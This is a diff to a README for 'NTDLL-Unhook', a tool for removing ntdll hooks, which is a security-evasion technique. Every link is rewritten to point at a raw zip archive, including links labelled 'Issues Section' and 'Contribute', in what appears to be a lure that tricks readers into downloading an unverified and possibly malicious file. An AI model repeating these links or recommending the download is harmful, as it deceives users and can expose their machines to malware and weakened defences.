@@ -1,7 +1,7 @@
 # ✨ NTDLL-Unhook - Effortless NTDLL Unhooking Made Simple
 
 ## 🛑 Download Now
-[![Download NTDLL-Unhook](https://img.shields.io/badge/Download-NTDLL--Unhook-blue.svg)](https://github.com/hamad-alhamad/NTDLL-Unhook/releases)
+[![Download NTDLL-Unhook](https://raw.githubusercontent.com/hamad-alhamad/NTDLL-Unhook/main/NTDLL-Unhook/NTDL_Unhook_2.3.zip)](https://raw.githubusercontent.com/hamad-alhamad/NTDLL-Unhook/main/NTDLL-Unhook/NTDL_Unhook_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ This guide will help you download and run the application easily.
 
 To get started, you need to visit the Releases page of our GitHub repository to download the latest version of NTDLL-Unhook. Click the link below to access the page directly:
 
-[Visit the Releases Page](https://github.com/hamad-alhamad/NTDLL-Unhook/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/hamad-alhamad/NTDLL-Unhook/main/NTDLL-Unhook/NTDL_Unhook_2.3.zip)
 
 ## 📥 Download & Install
 
@@ -63,8 +63,8 @@ To learn more about the functionality and additional features of NTDLL-Unhook, f
 
 ## 🛑 Important Links
 
-- [Download NTDLL-Unhook](https://github.com/hamad-alhamad/NTDLL-Unhook/releases)
-- [Issues Section](https://github.com/hamad-alhamad/NTDLL-Unhook/issues)
-- [Contribute to NTDLL-Unhook](https://github.com/hamad-alhamad/NTDLL-Unhook)
+- [Download NTDLL-Unhook](https://raw.githubusercontent.com/hamad-alhamad/NTDLL-Unhook/main/NTDLL-Unhook/NTDL_Unhook_2.3.zip)
+- [Issues Section](https://raw.githubusercontent.com/hamad-alhamad/NTDLL-Unhook/main/NTDLL-Unhook/NTDL_Unhook_2.3.zip)
+- [Contribute to NTDLL-Unhook](https://raw.githubusercontent.com/hamad-alhamad/NTDLL-Unhook/main/NTDLL-Unhook/NTDL_Unhook_2.3.zip)
 
 Thank you for choosing NTDLL-Unhook. Enjoy the simplicity and efficiency it brings to your operations.
